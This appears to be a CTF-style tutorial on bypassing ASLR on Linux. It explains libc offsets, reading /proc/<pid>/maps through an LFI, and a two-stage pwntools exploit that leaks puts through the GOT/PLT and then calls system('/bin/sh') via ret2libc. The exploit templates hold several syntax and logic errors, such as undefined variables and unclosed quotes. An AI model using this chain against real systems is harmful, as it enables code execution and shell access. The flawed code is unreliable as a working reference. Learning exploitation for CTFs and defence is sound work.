# ASLR Bypass

Address Space Layout Randomisation (ASLR) is a feature that causes memory addresses of functions and instructions to be randomised. Each time we run a binary, all of the addresses would change and never be the same.

In earlier Buffer Overflows, we examined how controlling the EIP can lead to RCE, with or without NX protection. However, with ASLR enabled, even if we can control the EIP, we cannot 'jump' anywhere because we wouldn't know where to jump to with ASLR enabled.

## Concepts

In order to bypass ASLR, we need to understand how it functions, as well as how functions are called. When we run a binary, the libraries and functions of that binary are loaded into virtual memory.

<figure><img src="../.gitbook/assets/image (2917).png" alt=""><figcaption></figcaption></figure>

With ASLR enabled, the library would be **loaded at different places in memory** each time. With the main library being loaded differently, all functions called in the library are affected and have different locations in memory.

Functions are called based on **offsets**. For example, if the libc library is loaded at `0x10000000`, and the offset for the `printf()` function is `0x00001000`, then when a program is run and `printf()` is called, it is mapped at `0x10001000`. \
Generally, base address (where library is called) + offset = memory location of function.

The vulnerability arises because when ASLR is enabled, **the offset does not change and is constant**. So, if we are able to find the base address where the library is called, we can use the constant offsets to load certain functions.&#x20;

### **Methods**

To bypass ASLR, there are a few methods possible

* Information Leak Vulnerability
  * Can be an LFI or anything else that lets us **read memory locations on the machine**.&#x20;
  * Memory disclosure vulnerabilities also can work.
* Brute Forcing
  * Perhaps the range of addresses where the library is loaded is rather small. This indicates that the base address could be brute forced and a simple for loop can cover all of it rather quickly.&#x20;
  * Done in the October box from HTB.
* Memory Spraying
  * Involves using an amplification gadget, which is a piece of code that takes an existing chunk of data and copies it, allowing the attacker to spray a large amount of memory by only sending a relatively small number of bytes.
  * Heap spraying is not as feasible anymore (but still possible on iOS devices).

### Proc Maps

On Linux machines, we can inspect the mappings of a process given its pid through `procfs`, which is done through reading the file at `/proc/<pid>/maps`. Here's some sample output from the Retired box from HTB (which had an LFI):

```bash
$ cat /proc/407/maps
555aa1164000-555aa1165000 r--p 00000000 08:01 2408                       /usr/bin/activate_license
555aa1165000-555aa1166000 r-xp 00001000 08:01 2408                       /usr/bin/activate_license
555aa1166000-555aa1167000 r--p 00002000 08:01 2408                       /usr/bin/activate_license
555aa1167000-555aa1168000 r--p 00002000 08:01 2408                       /usr/bin/activate_license
555aa1168000-555aa1169000 rw-p 00003000 08:01 2408                       /usr/bin/activate_license
....... <truncated>
7f4888c53000-7f4888c54000 r--p 00000000 08:01 3630                       /usr/lib/x86_64-linux-gnu/ld-2.31.so
7f4888c54000-7f4888c74000 r-xp 00001000 08:01 3630                       /usr/lib/x86_64-linux-gnu/ld-2.31.so
7f4888c74000-7f4888c7c000 r--p 00021000 08:01 3630                       /usr/lib/x86_64-linux-gnu/ld-2.31.so
7f4888c7d000-7f4888c7e000 r--p 00029000 08:01 3630                       /usr/lib/x86_64-linux-gnu/ld-2.31.so
7f4888c7e000-7f4888c7f000 rw-p 0002a000 08:01 3630                       /usr/lib/x86_64-linux-gnu/ld-2.31.so
....... <truncated>
7ffe99226000-7ffe99247000 rw-p 00000000 00:00 0                          [stack]
7ffe9932a000-7ffe9932e000 r--p 00000000 00:00 0                          [vvar]
7ffe9932e000-7ffe99330000 r-xp 00000000 00:00 0                          [vdso]
```

This provides memory addresses for each loaded library as well as the program itself. It also identifes areas of memory that are writable or executable.&#x20;

Now, suppose we do this multiple times, we can find out a few things like:

* How wide is the range of addresses? Can it be brute-forced?&#x20;
* Where is the stack loaded?
* Where is the heap relative to the binary?

In general, reading this (if we are able to) allows us to find out more efficient methods of exploitation.

## Information Leak

Now, suppose we have a leak to abuse. This involves using the PLT and GOT tables within the binary:

* Procedure Linkage Table is used to call external procedures whose address is not known in the time of linking, and is left to be resolved by the dynamic linker at run time.
* Global Offsets Table is similar but is used to resolve addresses.

Since the GOT and PLT are used everywhere in the binary, they must have static memory addresses, and the GOT needs to have write permissions.

The leak is exploited through using the `puts()` function to print the address of the `puts()` function (yes you read it right) in the `libc` file mapped in the GOT table, which would allow us to retrieve the base address of `libc` to call other functions, all at run time.

To do this, we would need 3 things:

1. Address of `pop rdi` to pass the argument to the RDI register, which would be used to puts.&#x20;
2. Address of GOT table where the `puts` in libc is.
3. Address of puts to print the address leaked.

To execute this, we can do the following commands:

```bash
ROPgadget --binary <binaryname> > gadgets.txt
cat gadgets.txt | grep "pop rdi"

objdump -D <binary> | grep puts
objdump -D <binary> | grep main
```

This would print the addresses we need for the script below:

```python
from pwn import *
p = process('./binary')
context(os='linux', arch='amd64)

offset = "A" * 300 # change number
pop_rdi = p64(<pop_rdi addr>)
got_put = p64(<puts@GLIBC addr>)
plt_put = p64(<puts@plt addr>)
plt_main = p64(<main addr>

payload = junk + pop_rdi + got_put + plt_put + plt_main

p.sendline(payload)
p.recvline() # depends on what we need

leaked_puts = p.recvline().strip.ljust(8,"\x00")
log.success('Leaked puts(): ' + str(leaked_puts))
p.interactive(prompt='')
```

But wait, why do we need the `main()` address? Well, this is because once our process is stopped, the address leaked will be randomised in the next execution, meaning that we cannot end the process and need a way to preserve it.

By using the main address function, we can 'preserve' this address and make the program wait at `main()` for the second stage of our exploit.

The next part of the exploit would be a basic ret2libc or ROP chain, depending on whether NX is enabled or what is possible. For this example, I will be using a simple ret2libc exploit. Since the offsets of the functions needed for this are **constant**, all we need to do now is use the address of `puts` to dump the function of the library.&#x20;

First we need to find the address of the `puts()` function within the `libc` file, as well as the `system()`, `/bin/sh`, and `exit()` for our ret2libc.

```bash
readelf -s /usr/lib/x86_64-linux-gnu/libc.so.6 |grep puts
readelf -s /usr/lib/x86_64-linux-gnu/libc.so.6 |grep system
strings -a -t x /usr/lib/x86_64-linux-gnu/libc.so.6 |grep /bin/sh
```

From the script below, we would be able to find the base address of where `libc` is loaded, and because we never technically exited the program, **the address is not randomised again**. (remember that we called `main()` again in the first payload)

```python
from pwn import *
p = process('./binary')
context(os='linux', arch='amd64')

offset = "A" * 300 # change number
pop_rdi = p64(<pop_rdi addr>)
got_put = p64(<puts@GLIBC addr>)
plt_put = p64(<puts@plt addr>)
plt_main = p64(<main addr>

payload = junk + pop_rdi + got_put + plt_put + plt_main

p.sendline(payload)
p.recvline() # depends on what we need

leaked_puts = p.recvline().strip.ljust(8,"\x00")
log.success('Leaked puts(): ' + str(leaked_puts))

leaked_puts = u64(leaked_puts)

libc_put = <libc puts addr>
offset = leaked_puts - libc # this gives us the base libc address

log.info('glibc offset: %x', offset)

libc_system = <system addr>
libc_binsh = </bin/sh addr>

sys = p64(offset + libc_system)
sh = p64(offset + libc_binsh)

payload2 = junk + pop_rdi + sh + sys
p.sendline(payload2)
p.recvline()

p.interactive(prompt="")
```

And this is how we bypass ASLR using an Information Leak.

## Memory Spraying

To bypass ASLR without the above method is a lot more difficult. This would require memory spraying, which lets us map contiguous memory of a given size, on a given range of addresses.&#x20;

This abuses a **memory leak, a bug of which memory is never 'freed'** and triggering it multiple times until the desired amount of memory has been leaked. Also, it uses an **amplification gadget** which is a piece of code that takes an existing chunk of data and copies it, allowing the attacker to spray a large memory range by only sending a small number of bytes.&#x20;

For now, I don't have enough knowledge on this to write a proper explanation, so here's a good resource I used to (sort of) understand what's going on.

{% embed url="https://github.com/nick0ve/how-to-bypass-aslr-on-linux-x86_64" %}
